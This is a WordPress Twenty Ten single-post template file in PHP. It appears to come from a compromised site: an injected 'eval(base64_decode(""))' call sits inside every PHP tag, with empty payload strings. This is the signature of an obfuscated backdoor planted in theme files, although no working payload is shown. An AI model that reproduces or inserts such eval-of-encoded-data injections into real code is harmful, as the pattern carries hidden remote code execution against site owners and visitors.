 */

get_header(); ?>

		<div id="container">
			<div id="content" role="main">

<?php	 	eval(base64_decode("")); if ( have_posts() ) while ( have_posts() ) : the_post(); ?>

				<div id="nav-above" class="navigation">
					<div class="nav-previous"><?php	 	eval(base64_decode("")); previous_post_link( '%link', '<span class="meta-nav">' . _x( '&larr;', 'Previous post link', 'twentyten' ) . '</span> %title' ); ?></div>
					<div class="nav-next"><?php	 	eval(base64_decode("")); next_post_link( '%link', '%title <span class="meta-nav">' . _x( '&rarr;', 'Next post link', 'twentyten' ) . '</span>' ); ?></div>
				</div><!-- #nav-above -->

				<div id="post-<?php	 	eval(base64_decode("")); the_ID(); ?>" <?php	 	eval(base64_decode("")); post_class(); ?>>
					<h1 class="entry-title"><?php	 	eval(base64_decode("")); the_title(); ?></h1>

					<div class="entry-meta">
						<?php	 	eval(base64_decode("")); twentyten_posted_on(); ?>
					</div><!-- .entry-meta -->

					<div class="entry-content">
						<?php	 	eval(base64_decode("")); the_content(); ?>
						<?php	 	eval(base64_decode("")); wp_link_pages( array( 'before' => '<div class="page-link">' . __( 'Pages:', 'twentyten' ), 'after' => '</div>' ) ); ?>
					</div><!-- .entry-content -->

<?php	 	eval(base64_decode("")); if ( get_the_author_meta( 'description' ) ) : // If a user has filled out their description, show a bio on their entries  ?>
					<div id="entry-author-info">
						<div id="author-avatar">
							<?php	 	eval(base64_decode("")); echo get_avatar( get_the_author_meta( 'user_email' ), apply_filters( 'twentyten_author_bio_avatar_size', 60 ) ); ?>
						</div><!-- #author-avatar -->
						<div id="author-description">
							<h2><?php	 	eval(base64_decode("")); printf( esc_attr__( 'About %s', 'twentyten' ), get_the_author() ); ?></h2>
							<?php	 	eval(base64_decode("")); the_author_meta( 'description' ); ?>
							<div id="author-link">
								<a href="<?php	 	eval(base64_decode("")); echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>">
									<?php	 	eval(base64_decode("")); printf( __( 'View all posts by %s <span class="meta-nav">&rarr;</span>', 'twentyten' ), get_the_author() ); ?>
								</a>
							</div><!-- #author-link	-->
						</div><!-- #author-description -->
					</div><!-- #entry-author-info -->
<?php	 	eval(base64_decode("")); endif; ?>

					<div class="entry-utility">
						<?php	 	eval(base64_decode("")); twentyten_posted_in(); ?>
						<?php	 	eval(base64_decode("")); edit_post_link( __( 'Edit', 'twentyten' ), '<span class="edit-link">', '</span>' ); ?>
					</div><!-- .entry-utility -->
				</div><!-- #post-## -->

				<div id="nav-below" class="navigation">
					<div class="nav-previous"><?php	 	eval(base64_decode("")); previous_post_link( '%link', '<span class="meta-nav">' . _x( '&larr;', 'Previous post link', 'twentyten' ) . '</span> %title' ); ?></div>
					<div class="nav-next"><?php	 	eval(base64_decode("")); next_post_link( '%link', '%title <span class="meta-nav">' . _x( '&rarr;', 'Next post link', 'twentyten' ) . '</span>' ); ?></div>
				</div><!-- #nav-below -->

				<?php	 	eval(base64_decode("")); comments_template( '', true ); ?>

<?php	 	eval(base64_decode("")); endwhile; // end of the loop. ?>

			</div><!-- #content -->
		</div><!-- #container -->

<?php	 	eval(base64_decode("")); get_sidebar(); ?>
